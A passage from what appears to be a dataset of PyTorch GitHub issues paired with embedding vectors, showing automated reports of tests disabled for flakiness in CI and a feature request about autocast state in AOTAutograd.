 -6.89527169e-02  2.35919625e-01  2.61500403e-02 -3.58644351e-02
 -9.49517414e-02  4.15698320e-01 -1.53780580e-01  4.36034769e-01
  1.11834437e-01  1.02539912e-01 -1.27923638e-01  3.32333595e-02
  3.18739563e-03 -1.98230714e-01  4.73496139e-01 -6.60552025e-01
  3.11334562e-02  1.12713993e-01  2.14017868e-01 -1.29408017e-01
  4.04689342e-01  1.52639315e-01  8.77814461e-03 -1.70943320e-01
  3.54062170e-02  2.71019518e-01 -6.38986826e-02 -1.02702238e-01
  2.97299266e-01 -3.81326646e-01 -1.67271778e-01 -1.65622741e-01
 -3.09154272e-01 -1.10891983e-01 -4.21894565e-02  1.55272126e-01
 -8.00752547e-03  5.69760799e-02 -3.67554158e-01  1.29386917e-01
  2.88556814e-01 -2.76360750e-01 -1.38414335e-02 -3.87282312e-01
 -4.08380292e-02  7.23337531e-02  1.79085374e-01 -2.48019472e-01
 -7.71426931e-02  3.59822661e-02  1.10607728e-01 -1.78465638e-02
  5.39774299e-01 -2.56471872e-01  1.69594258e-01  2.65134394e-01
 -1.18787058e-01  3.05874348e-01  3.23237889e-02 -4.16290574e-02
 -1.77912116e-01  1.49127871e-01  7.18581378e-02  1.25486061e-01
  3.18051994e-01 -1.22116804e-01 -4.00166094e-01  1.55756146e-01
  1.22039370e-01 -1.08331628e-01 -4.28674370e-01 -3.42866406e-04
 -1.10188372e-01  8.99460614e-02  1.08296778e-02 -1.20678343e-01
 -1.47444516e-01 -1.66299820e-01 -6.66725263e-03 -8.53146464e-02
 -2.15256318e-01  5.37139177e-01  1.81169175e-02 -1.90525085e-01
  9.46049243e-02  3.33628282e-02  1.21687911e-01 -2.85287946e-01
 -8.51257145e-02 -3.34792696e-02  1.19501516e-01  1.74801931e-01
  2.02222764e-01  1.70515627e-01 -1.63267739e-02 -2.50748824e-02
 -3.79874706e-01 -1.99529767e-01 -1.64455064e-02  4.61098343e-01
  1.39779210e-01  3.97689342e-02  1.95383176e-01  5.60926974e-01
 -1.70981765e-01 -2.14588687e-01 -2.05518782e-01 -2.60512233e-01
  2.60015130e-01 -1.56825036e-01  3.13058682e-02  6.06278926e-02
  4.14417833e-02  2.31580764e-01 -2.51707494e-01  2.32885882e-01
 -1.14567958e-01  2.74990380e-01  4.91917878e-02 -9.16961730e-02
  6.94289654e-02 -2.08822846e-01 -5.31722978e-02  1.88206509e-02
 -2.02062339e-01  7.57780671e-02 -7.58323818e-02  1.65778935e-01]"
DISABLED test_meta_outplace_std_mean_cpu_float32 (__main__.TestMetaCPU) triaged module: flaky-tests skipped module: primTorch oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_meta_outplace_std_mean_cpu_float32&suite=TestMetaCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18275880280).

Over the past 3 hours, it has been determined flaky in 14 workflow(s) with 42 failures and 14 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_meta_outplace_std_mean_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_meta.py`

cc @ezyang @mruberry @Lezcano @peterbell10 @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.06944191e-01  1.31064996e-01 -1.70375295e-02  2.74932086e-01
  2.04826053e-02 -3.73056710e-01  3.71950381e-02  3.64360690e-01
 -1.81107596e-01 -2.71127850e-01  2.70424724e-01 -1.19669884e-01
  3.27252448e-01 -1.15018763e-01 -1.62992984e-01 -1.90029889e-01
 -1.71028748e-01 -2.25628600e-01  3.88454288e-01  1.15259714e-01
 -6.74497560e-02  3.96562740e-02 -3.33311260e-01  3.73220146e-01
  9.78388339e-02  1.09247625e-01 -2.93566227e-01  1.19758546e-01
 -1.24164112e-03  3.58143538e-01  2.77609706e-01  3.24526697e-01
 -4.80662435e-01  4.61084619e-02  5.72047472e-01  7.96433017e-02
 -1.54630750e-01 -1.46350116e-01 -2.56697327e-01 -2.26833731e-01
  1.53301254e-01  4.28578034e-02  9.22585204e-02 -5.45400232e-02
  2.75143385e-01 -3.05367243e-02 -1.62612408e-01  1.52516544e-01
 -2.54857779e-01 -4.48193774e-02  3.74119580e-02 -8.18461329e-02
 -6.14514351e-02 -4.51146543e-01  1.37020007e-01 -1.77860171e-01
  3.00817192e-01  2.73563385e-01  1.45592526e-01  1.60201564e-01
  2.30677158e-01 -1.07574612e-01  6.72194362e-03 -4.30601984e-02
 -2.18542293e-02  8.67532939e-02  1.54155657e-01 -1.93043977e-01
  5.30784011e-01 -1.15705252e-01  1.76783428e-01  4.35427837e-02
 -2.12787732e-01 -2.03477535e-02  1.49702832e-01  2.39960521e-01
 -2.76156873e-01 -2.15730563e-01 -6.93945512e-02 -6.34725615e-02
  7.96661377e-02  2.09022820e-01 -2.38833316e-02 -7.38958642e-02
  1.19267344e-01 -1.60306487e-02  1.44650653e-01 -9.15709510e-02
  1.41000837e-01 -1.35819182e-01  3.05617630e-01  9.18303207e-02
 -2.94570506e-01  2.09660038e-01 -2.46740371e-01  1.65791363e-02
  3.91395986e-01 -1.95911467e-01 -1.69883341e-01 -1.50534464e-03
  3.17748666e-01 -2.07044184e-01 -2.69660383e-01  2.21478134e-01
 -2.59949505e-01 -2.18455106e-01  4.08184946e-01  2.45185405e-01
  1.45924777e-01 -2.01008976e-01  9.79237258e-02  8.86025000e-03
  1.49667598e-02  4.78372276e-02  4.66838442e-02  1.75785899e-01
 -2.13169143e-01 -7.56201744e-02  2.23251991e-02  4.50281858e-01
 -2.48087943e-01  3.28118987e-02  8.35773200e-02 -1.60285711e-01
  3.87582362e-01 -1.81984395e-01  8.66914392e-02  4.37553339e-02
  1.46666557e-01 -9.35016721e-02 -2.29348019e-02 -4.98759672e-02
 -1.00332960e-01 -2.66973972e-01  1.54575035e-01 -3.07442211e-02
  5.34621626e-02 -1.27918422e-01  1.63516492e-01  9.12228376e-02
 -4.11022007e-01  5.45689091e-03 -8.56504887e-02 -3.39895725e-01
  2.94956237e-01 -4.58006226e-02 -1.89542204e-01  2.74169724e-02
  1.28155798e-01  1.14323236e-02  1.60990208e-01  6.30815253e-02
 -5.82428053e-02  4.87973511e-01 -1.53287902e-01  1.99369848e-01
  1.75076872e-01  1.72489315e-01  2.02164084e-01 -3.11411917e-02
  3.62298712e-02  3.90738130e-01  2.87983902e-02 -2.69101076e-02
  2.06232771e-01 -5.75766414e-02 -4.06786531e-01 -7.40900710e-02
 -3.44079494e-01  2.36125380e-01  5.19839451e-02 -2.33298261e-03
  3.17156836e-02 -7.40491506e-03  1.04507338e-02 -1.98643446e-01
  1.28207281e-01 -2.35544860e-01 -1.03518009e-01  2.99096346e-01
  8.34005177e-02  1.42995209e-01  5.64938672e-02  2.99791574e-01
 -7.23764598e-02  4.32386287e-02  2.42715448e-01 -1.33643255e-01
  1.14419445e-01  4.97668013e-02 -4.51816738e-01  2.09301319e-02
  2.11568817e-01  1.04483917e-01 -2.30754286e-01 -2.05662355e-01
  1.10243231e-01  8.14890414e-02  7.06423521e-02 -1.56154018e-02
 -2.31579572e-01  2.76513368e-01  1.24117658e-01 -1.24474563e-01
 -2.48364676e-02  8.89464840e-02 -1.50734633e-01 -3.38640332e-01
  6.66186363e-02  1.91104542e-02 -4.63399589e-01 -1.00600258e-01
  4.79012020e-02 -2.19774470e-01  7.37907141e-02  3.98623794e-02
 -8.40151086e-02 -1.57060906e-01 -6.47389367e-02  1.97730362e-01
 -9.64091420e-02 -2.41167113e-01 -2.26785257e-01 -1.26390636e-01
 -1.96758911e-01  1.05286837e-01 -2.07083642e-01  8.15863833e-02
 -1.71731681e-01  2.49242745e-02 -1.67189434e-01 -1.37379169e-01
  4.24763411e-01  2.21306130e-01  2.31300205e-01 -9.34987292e-02
 -3.13809097e-01  2.69966759e-03  4.62180749e-02  1.71291828e-01
 -3.83962393e-01 -5.16548395e-01 -1.02317698e-01  2.50429928e-01
  1.01573877e-01 -7.72403106e-02 -2.96631366e-01 -2.06405163e-01
 -2.51180857e-01  9.67170484e-03 -1.51893273e-01 -3.41010690e-01
  2.28108883e-01 -2.03708664e-01  1.33140177e-01  4.92030919e-01
  2.67978180e-02 -3.26234251e-02  8.85394029e-03 -2.02399284e-01
  2.84320377e-02  2.40656912e-01 -1.58285469e-01  2.05337852e-01
  3.33139300e-02  1.16712615e-01 -3.22821915e-01  4.66667116e-04
  9.23213065e-02  1.63190626e-02  2.99896777e-01 -7.44277358e-01
  2.58549482e-01  2.17104852e-01  3.35535884e-01 -3.51048052e-01
  4.37529922e-01 -1.95574816e-02  4.43264619e-02 -1.56197101e-01
  3.09684515e-01  2.15929061e-01 -1.82379454e-01 -1.28998816e-01
  2.89558977e-01 -2.17281237e-01 -2.39559233e-01 -1.31395221e-01
 -2.54108131e-01 -4.23742533e-02 -1.51198745e-01 -1.02306634e-01
  1.17874593e-02 -1.56582564e-01 -3.47320616e-01  1.32687792e-01
  1.35394573e-01 -3.82194400e-01  8.71539563e-02 -2.82540739e-01
 -2.32355267e-01  1.42149568e-01  1.93545550e-01 -1.65168881e-01
  1.06015861e-01  4.03250083e-02  4.20634151e-01 -4.82180789e-02
  3.87133121e-01 -4.40737158e-01 -8.66250396e-02  3.48544240e-01
 -1.52133495e-01  3.13785195e-01  2.90134475e-02 -1.14708096e-01
 -5.74265011e-02  1.47614509e-01 -5.16599305e-02  1.09571069e-01
  1.34916365e-01 -1.84767976e-01 -1.60327017e-01  3.47129434e-01
  5.22360504e-02 -1.20223492e-01 -2.90831804e-01 -5.45188785e-02
 -7.42548630e-02 -1.10662490e-01 -5.61329648e-02 -7.35019566e-03
 -2.08623767e-01 -1.45090640e-01 -2.64479518e-01 -1.41838454e-02
 -1.84712961e-01  4.75748658e-01  1.00333899e-01 -2.56257862e-01
 -3.81096601e-02  3.10146138e-02  1.30462736e-01 -4.96520370e-01
 -1.18193954e-01  1.17695987e-01  1.39764100e-01  2.33364746e-01
  2.10267216e-01  9.20147002e-02 -1.09867841e-01 -4.24484164e-02
 -2.63280272e-01 -8.01222473e-02  6.22095577e-02  3.88833582e-01
  1.40278786e-01  7.13747144e-02  3.26801717e-01  5.48071504e-01
 -1.44176036e-01  4.90285717e-02 -3.29486072e-01 -2.63487697e-01
  6.19522557e-02 -2.07975172e-02 -1.12065464e-01  8.27701762e-02
  9.52710658e-02 -1.31000951e-01 -3.76420259e-01  4.83613759e-02
 -2.55297780e-01  2.52696961e-01  1.67362750e-01  1.32816806e-01
  1.22211091e-01 -1.92319125e-01  1.97715443e-02 -7.65859038e-02
  2.16124773e-01  5.53261191e-02 -1.05727822e-01  2.42171556e-01]"
DISABLED test_dropout_backward_layout_torch_strided_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_backward_layout_torch_strided_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18279909555).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_backward_layout_torch_strided_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.79843265e-01  2.11593732e-01 -1.90711796e-01  4.28583883e-02
 -3.45774218e-02 -4.12766457e-01  1.08576473e-02  1.75517738e-01
 -4.43629712e-01 -1.91717520e-01  2.47386113e-01 -1.27200961e-01
  1.21536635e-01  6.33865446e-02  1.43113628e-01 -1.49700761e-01
 -1.07698657e-01 -1.02364682e-02  4.34413791e-01  3.87814492e-02
 -1.74202859e-01  6.64855912e-02 -2.44631916e-01  2.63722301e-01
 -7.20628053e-02  1.03218183e-01 -2.01824665e-01 -4.46143746e-02
  8.79668742e-02  9.95287895e-02  2.06003040e-01 -6.04305789e-02
 -4.25179362e-01  2.28253305e-02  4.26679075e-01  2.25479811e-01
 -1.21674433e-01 -1.07298911e-01 -4.71763611e-01 -5.27232848e-02
  2.57090867e-01  1.49269015e-01 -1.38122812e-01 -1.16323665e-01
  2.27275044e-01  6.76789135e-02 -2.24896908e-01  3.44880462e-01
 -3.76408249e-01 -1.39754146e-01  2.47450486e-01 -1.42908528e-01
  7.88632967e-03 -3.07918489e-01  1.71281785e-01 -1.24813981e-01
  1.47181854e-01  3.66366684e-01  2.01439843e-01  7.23436475e-02
  1.14104494e-01 -1.23735666e-02 -1.62891150e-01  1.27852485e-02
 -9.11530033e-02 -4.30151150e-02  1.92506850e-01 -1.94220871e-01
  4.11933810e-01 -3.33878100e-02  1.02041006e-01 -1.80316314e-01
 -2.03311414e-01  3.29176895e-02  1.61988601e-01  2.44193584e-01
 -4.72878039e-01  2.16354802e-02 -2.07827657e-01 -2.55243659e-01
  7.28510767e-02 -1.07614603e-03 -3.49662676e-02  2.69883037e-01
  2.33674645e-01  5.44600859e-02  1.49028346e-01 -5.41634634e-02
  1.86902583e-01 -6.73274845e-02  4.10551950e-02  1.42247796e-01
 -9.75525826e-02  7.76930004e-02 -3.83234322e-01  1.81919690e-02
  2.55327106e-01 -2.74567068e-01 -2.54187524e-01  1.18561812e-01
  5.01492396e-02 -5.88108778e-01 -2.38382705e-02  5.07549524e-01
 -1.55681461e-01 -3.71269703e-01  4.35818881e-01  1.29193738e-01
  1.93886817e-01 -1.53892517e-01  1.53990671e-01  7.95768574e-02
  3.08454745e-02  1.86138861e-02  7.83986747e-02 -2.48260006e-01
 -3.12653542e-01 -1.29548669e-01 -1.26715479e-02  5.72347879e-01
 -1.09177440e-01 -4.82629538e-02  1.50883719e-01  1.23847313e-01
  4.39185500e-01 -8.29375759e-02 -8.53221342e-02  8.12097043e-02
  2.03015640e-01  2.19506584e-03  8.81032646e-03  1.00485481e-01
 -1.28486142e-01 -1.86477959e-01  1.88325524e-01  5.80444932e-02
 -1.86121434e-01 -1.39373034e-01  1.47496641e-01 -7.02331513e-02
 -1.80629492e-01  2.51716703e-01  6.11918718e-02 -2.44198531e-01
  3.80748898e-01 -3.20796445e-02 -1.21200055e-01  8.98216069e-02
 -1.26354713e-02  1.21519789e-01  4.06937823e-02  1.19971000e-02
  8.62133652e-02  4.02260989e-01  3.96417268e-02  3.41933034e-03
  2.56724775e-01  1.46505326e-01  1.84476510e-01 -1.46087259e-01
  3.30565907e-02  4.04116243e-01 -1.12267788e-02  3.36339772e-02
  2.75191516e-01 -2.85394102e-01 -4.80690062e-01  3.09561007e-02
 -1.97883293e-01  7.87914395e-02 -1.11264750e-01 -7.44592249e-02
  1.64890401e-02  2.57557053e-02  3.36084142e-03 -8.12224597e-02
  2.20683828e-01 -3.75713706e-01 -2.12018475e-01  3.00200582e-01
  2.29885995e-01  1.73934519e-01  3.33898962e-01  5.81749827e-02
 -3.68422270e-02  3.36760044e-01  3.40384811e-01 -1.43633798e-01
 -9.79709066e-03 -5.12575693e-02 -7.28976965e-01 -2.62945503e-01
  9.97003764e-02 -7.96183050e-02 -2.29141116e-01 -1.03675745e-01
  6.73116446e-02 -2.45390758e-01 -3.87706831e-02  8.85926373e-03
 -2.63819009e-01  3.20052922e-01  2.01495722e-01 -2.31231079e-01
  6.97772019e-03  3.00189614e-01 -3.81198406e-01 -5.11697650e-01
  8.12469572e-02 -4.18542884e-04 -1.80373698e-01 -1.02875113e-01
 -7.59875327e-02 -2.38049328e-01  1.57886639e-01  9.28893387e-02
 -1.02417797e-01  1.04154766e-01 -3.46943699e-02  2.08265379e-01
 -1.94949195e-01  3.10737155e-02 -3.85105163e-01 -2.28656754e-01
 -4.44815576e-01  8.32167938e-02 -3.21743667e-01  3.41382980e-01
 -1.98369790e-02  2.69961152e-02 -2.03125104e-01 -2.62232840e-01
  1.67657554e-01  1.02555342e-02  2.43452549e-01 -1.51068330e-01
 -1.48808271e-01 -1.17835186e-01  1.35370232e-02  4.90328580e-01
 -5.37997305e-01 -5.51509738e-01  1.00310855e-02  1.20309815e-01
 -4.69524832e-03  1.49285048e-01 -3.58534157e-01 -7.47870505e-02
 -1.19548917e-01  1.27194852e-01 -7.29946047e-02 -1.72831714e-01
 -1.21754870e-01 -6.03817217e-02  1.57485470e-01  4.94644463e-01
 -5.05852178e-02 -4.72036414e-02  3.87801304e-02 -3.09561826e-02
 -2.13720813e-01  4.01208997e-01 -1.72797099e-01  4.01238561e-01
  2.51489043e-01  1.91130843e-02 -1.32333040e-01  6.71263933e-02
  5.50813414e-02 -1.20940626e-01  2.91408390e-01 -6.56629384e-01
  1.29500404e-01  1.89145416e-01  1.62991658e-01 -1.98339224e-01
  4.02428627e-01  2.99180984e-01  5.76407909e-02 -2.61445224e-01
  1.84175640e-01  1.43042132e-01 -1.86520681e-01 -1.60042346e-02
  1.93018645e-01 -3.43154490e-01 -4.59000794e-03 -1.22494986e-02
 -1.39060944e-01 -1.90812528e-01 -1.07175976e-01  1.60157770e-01
  2.47512534e-01  2.67611220e-02 -5.52999735e-01  3.76428664e-02
  4.12189007e-01 -2.50575304e-01  1.33983344e-01 -2.17398673e-01
 -1.03407748e-01  9.71134901e-02  1.33603543e-01 -2.54407614e-01
  2.49637812e-02 -1.47701666e-01  2.07893133e-01 -9.66262370e-02
  5.15815139e-01 -2.73986101e-01 -1.65845782e-01  2.12943599e-01
 -5.48221730e-02  2.38505930e-01  1.22248240e-01  9.15752798e-02
  7.89565891e-02  1.08645275e-01 -7.33771697e-02  8.61349329e-02
  4.14688170e-01 -2.09648401e-01 -2.69988805e-01  2.18557000e-01
  1.55771747e-01 -7.15899318e-02 -1.98994547e-01  1.06617482e-02
 -1.19012728e-01 -9.41845775e-02 -1.34758919e-01 -9.51183438e-02
 -3.49321626e-02 -6.96630701e-02  5.85686341e-02 -1.39387071e-01
 -5.37563711e-02  6.27360344e-01 -7.50654563e-02 -2.41362870e-01
 -7.05192685e-02  8.68220776e-02  6.98887706e-02 -2.72098660e-01
 -1.60207003e-01 -5.06654568e-02  2.15072036e-01 -9.13534462e-02
  1.62173554e-01  1.64030999e-01 -2.95161933e-01  8.06503743e-02
 -2.04332262e-01 -1.05796069e-01  1.03247017e-01  5.57665229e-01
  6.90573305e-02  1.94483608e-01  3.72433275e-01  6.21672034e-01
 -6.85212836e-02  6.35915250e-03 -3.53982657e-01 -3.59601706e-01
  1.83144271e-01 -3.85905355e-02  1.14793060e-02  2.77779810e-03
  4.91881035e-02  2.98337519e-01 -4.37113971e-01  2.35917479e-01
 -1.38166398e-01  2.33218342e-01  2.65519798e-01 -5.66955805e-02
  3.33395988e-01 -3.17211241e-01  1.32844085e-02  1.19759534e-02
 -1.87224045e-01  3.60392556e-02 -5.07441759e-02  1.87561840e-01]"
DISABLED test_dropout_backward_layout_torch_jagged_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_backward_layout_torch_jagged_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18273652592).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_backward_layout_torch_jagged_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-4.00626928e-01  1.45366654e-01 -1.34612218e-01  1.51125342e-02
 -3.46425064e-02 -4.91917431e-01 -2.17318907e-02  1.89776197e-01
 -4.34411258e-01 -2.01990068e-01  2.24349082e-01 -1.25720724e-01
  1.86388344e-01  8.21210071e-02  8.90575275e-02 -7.95929879e-02
 -1.45701945e-01 -1.31440774e-01  5.14640212e-01  4.79304194e-02
 -1.78636581e-01  9.06870887e-03 -2.15971291e-01  2.87296683e-01
  2.15800758e-03  7.83886909e-02 -1.92034021e-01 -5.33270724e-02
  1.46683864e-02  8.09024274e-03  2.01308772e-01  2.79824790e-02
 -4.38633978e-01  1.45599563e-02  4.19673592e-01  1.51539043e-01
 -1.17996268e-01 -3.12426034e-02 -4.51714158e-01 -1.20230027e-01
  1.82450116e-01  2.21091568e-01 -5.41398227e-02 -9.58426893e-02
  1.90086454e-01  1.13034472e-01 -1.81301787e-01  2.97769189e-01
 -3.28138769e-01 -2.03585088e-01  2.30994806e-01 -1.37186766e-01
  3.36219207e-03 -3.44313294e-01  1.87523454e-01 -1.79924935e-01
  1.57666981e-01  3.65241140e-01  2.06902087e-01  1.74958348e-01
  2.04484478e-01 -1.10068200e-02 -1.68277711e-01 -2.74074078e-03
 -6.04567751e-02  3.37756164e-02  2.49776214e-01 -1.88615829e-01
  3.45305294e-01 -1.42017473e-02  2.12109223e-01 -1.84696436e-01
 -1.92345664e-01 -1.47897480e-02  1.71747655e-01  1.13008678e-01
 -4.85177279e-01  6.65762927e-03 -2.64381170e-01 -1.41357228e-01
  4.73972782e-02  4.19263840e-02 -4.99784723e-02  1.81232825e-01
  2.71487951e-01  6.09392375e-02  1.37272492e-01 -1.14036433e-01
  1.75281420e-01 -5.17392531e-02  1.10435344e-01  1.75488740e-01
 -1.35961369e-01  1.22190997e-01 -3.47829670e-01 -6.69587404e-03
  2.95920819e-01 -2.70349503e-01 -1.89198405e-01  1.55813470e-01
  5.02485409e-02 -5.53260446e-01 -4.91785705e-02  4.17491645e-01
 -1.00821108e-01 -3.24194998e-01  4.16270554e-01  2.09225148e-01
  1.19093820e-01 -1.58456713e-01  1.72621548e-01  9.05499682e-02
  8.86080693e-03  6.57813400e-02  1.18987344e-01 -2.94782460e-01
 -2.31241241e-01 -1.29864514e-01 -1.21883757e-01  5.58391094e-01
 -8.59682187e-02 -4.51489389e-02  5.82563430e-02  1.41997874e-01
  4.47537839e-01 -2.52747089e-02 -1.38054907e-01  8.25595260e-02
  2.71383047e-01  5.65409288e-02 -5.88407665e-02  8.98531377e-02
 -1.62453979e-01 -1.88894629e-01  1.68228418e-01  6.01118878e-02
 -2.25672632e-01 -1.47339195e-01  1.34002000e-01 -5.11567183e-02
 -2.10390478e-01  2.51536071e-01  1.03702068e-01 -2.97952384e-01
  3.58921677e-01 -1.91933103e-02 -2.50639677e-01  7.03003109e-02
 -3.68418768e-02  1.16462871e-01  3.14795412e-04  2.10246146e-02
  6.56430423e-02  4.13775027e-01  6.04467764e-02 -9.63099673e-03
  2.44323894e-01  1.78464040e-01  1.56021670e-01 -1.31777018e-01
  1.54522896e-01  3.70241284e-01 -7.86150992e-02  6.00873679e-03
  1.78965598e-01 -2.90178895e-01 -5.24723530e-01  7.24752061e-03
 -1.06365800e-01  4.22890708e-02 -1.42437473e-01 -5.21997772e-02
  7.45020136e-02  2.11197659e-02  8.47527757e-04 -5.44467196e-02
  2.18550414e-01 -3.57771873e-01 -1.89635471e-01  3.07360917e-01
  1.90462500e-01  1.51445553e-01  2.96166182e-01  1.23760216e-01
 -1.86664090e-02  2.43683845e-01  2.93363273e-01 -1.13040060e-01
  8.97675194e-03 -8.38387161e-02 -7.40190983e-01 -2.42713377e-01
  8.72090608e-02 -1.14491217e-01 -2.04939827e-01 -4.13194299e-02
 -2.26565264e-02 -2.87037790e-01 -1.11981168e-01 -4.35543619e-03
 -2.76816547e-01  3.12866271e-01  1.91970095e-01 -1.25260383e-01
 -1.85048468e-02  2.17603818e-01 -2.90113866e-01 -4.12787557e-01
 -2.83211917e-02  6.69562891e-02 -2.28058562e-01 -1.02449030e-01
 -9.35765505e-02 -1.45336032e-01  2.07749665e-01 -6.67754933e-03
 -6.74234331e-02  5.59418574e-02 -8.21612179e-02  2.25972950e-01
 -1.08502641e-01 -5.79154566e-02 -3.49139303e-01 -2.11643904e-01
 -4.34269488e-01  2.84570251e-02 -2.49744520e-01  3.10319841e-01
 -2.98623722e-02  1.75262392e-02 -2.31844336e-01 -1.67315960e-01
  1.10816255e-01  9.73934308e-03  2.53115416e-01 -1.59826398e-01
 -2.36631468e-01 -1.65208593e-01  5.25577692e-03  4.92166817e-01
 -5.12222052e-01 -4.66791302e-01 -7.76546448e-03  1.07212618e-01
  2.48744376e-02  9.00118351e-02 -2.46142253e-01 -1.90673217e-01
 -1.25604689e-01  1.81151018e-01 -1.08474031e-01 -1.69343755e-01
 -6.80449307e-02 -4.63749170e-02  1.43182158e-01  4.80855882e-01
 -1.62780583e-02 -5.56275155e-03  6.74074441e-02  6.64870143e-02
 -1.63062543e-01  2.56958902e-01 -1.97322190e-01  3.69973302e-01
  9.58876312e-02  1.27040535e-01 -1.64148360e-01  2.41578668e-02
  8.43247212e-03 -1.11649767e-01  2.68425196e-01 -5.66467404e-01
  1.60701126e-01  2.03109264e-01  1.97561160e-01 -1.51188761e-01
  4.75743413e-01  2.41371572e-01 -5.53508475e-03 -2.34156877e-01
  1.37637168e-01  2.02854753e-01 -1.27229705e-01  2.23257765e-02
  2.27630734e-01 -2.83831894e-01 -7.15446994e-02 -7.00854957e-02
 -1.23851031e-01 -1.67460918e-01 -5.48559353e-02  1.73559949e-01
  1.56698421e-01 -2.10128166e-03 -4.57370281e-01  1.27673551e-01
  3.44044596e-01 -2.65076041e-01  1.75958127e-01 -2.04602659e-01
 -1.10324614e-01  1.48496345e-01  6.89275861e-02 -2.30316132e-01
  1.13001317e-01 -3.89827937e-02  1.57773748e-01 -4.87879366e-02
  5.00930488e-01 -3.09468448e-01 -1.24492303e-01  2.29558498e-01
 -3.35223228e-02  2.94681251e-01  1.99598372e-02  8.62686038e-02
  1.09895170e-01  1.91153646e-01  1.01178288e-02  7.48839602e-02
  4.59204614e-01 -1.10353328e-01 -3.06803018e-01  1.35088235e-01
  1.43230915e-01 -2.06953995e-02 -2.71698713e-01  8.55913386e-03
 -1.66356996e-01 -1.16641603e-01 -1.56289056e-01 -1.11655310e-01
 -8.15485567e-02 -8.22905302e-02 -5.53765520e-03 -1.56244904e-01
 -5.58586791e-02  5.07731438e-01 -7.93237388e-02 -2.58484840e-01
 -4.29558456e-02  7.64037892e-02  1.49373025e-01 -2.71732658e-01
 -2.40659758e-01  3.46325226e-02  1.78562522e-01  2.57008448e-02
  1.18044563e-01  2.09941566e-01 -2.27788016e-01  2.25144289e-02
 -2.48514622e-01 -6.36153519e-02  8.03493932e-02  5.29152036e-01
 -5.39137609e-02  2.27536306e-01  3.23794365e-01  6.69100285e-01
 -1.24374077e-01 -3.38823497e-02 -3.45941484e-01 -2.87523389e-01
  2.09643215e-01 -8.56699497e-02 -6.93650618e-02 -1.90111212e-02
  2.50283908e-02  3.21467221e-01 -4.03763026e-01  2.70140529e-01
 -1.95560992e-01  2.54667014e-01  2.20351636e-01 -6.43747449e-02
  3.47172081e-01 -2.33784199e-01 -3.25973853e-02 -1.12274699e-02
  1.41157582e-03  9.94047970e-02 -5.40365651e-02  1.63356721e-01]"
[aot_autograd] Improve aotautograd hygeine by ensuring (asserting) that autocast state is not mutated oncall: pt2 module: aotdispatch,"### ðŸš€ The feature, motivation and pitch

There is no reason that an fx graph passed to AOTAutograd will not exit all of its graph-instantiated autocast context managers.

For simplicity's sake, let's just assert that these are never mutated when running the fw graph.

### Alternatives

Bugs like those fixed by:
https://github.com/pytorch/pytorch/pull/112231
https://github.com/pytorch/pytorch/pull/112396

### Additional context

NIL

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-1.56631559e-01 -1.88369989e-01  1.04140729e-01 -4.24149513e-01
  4.30084199e-01 -1.36089295e-01  1.16766736e-01  4.45701405e-02
 -4.18651998e-01 -4.99936193e-02  1.15358248e-01  3.66726965e-01
 -1.43027445e-03  1.81068018e-01 -1.81473330e-01  1.97359353e-01
 -1.12188451e-01 -2.16872782e-01 -1.53956320e-02 -9.20854658e-02
  3.29099655e-01  3.46188508e-02  1.78582162e-01 -2.98099359e-03
  1.30174413e-01  9.49551258e-03 -7.74613768e-02 -2.06242129e-01
  2.14694738e-01  1.97823703e-01  3.67757767e-01  1.68758724e-02
  6.24078214e-02 -3.25912535e-01 -1.65746603e-02 -1.47165626e-01
 -4.11989123e-01 -2.16990057e-03 -2.48868346e-01 -2.32640848e-01
  1.43203825e-01 -2.67642904e-02 -7.49807581e-02  6.67733103e-02
 -2.44272128e-01 -3.03819537e-01  6.71778247e-02  8.64864662e-02
 -2.30678439e-01  1.16097312e-02  6.31467178e-02 -1.83570981e-01
 -5.01349330e-01 -2.48743802e-01 -3.80122848e-02  2.82546371e-01
  4.26167250e-03  2.08296299e-01  2.54821181e-01  1.07514270e-01
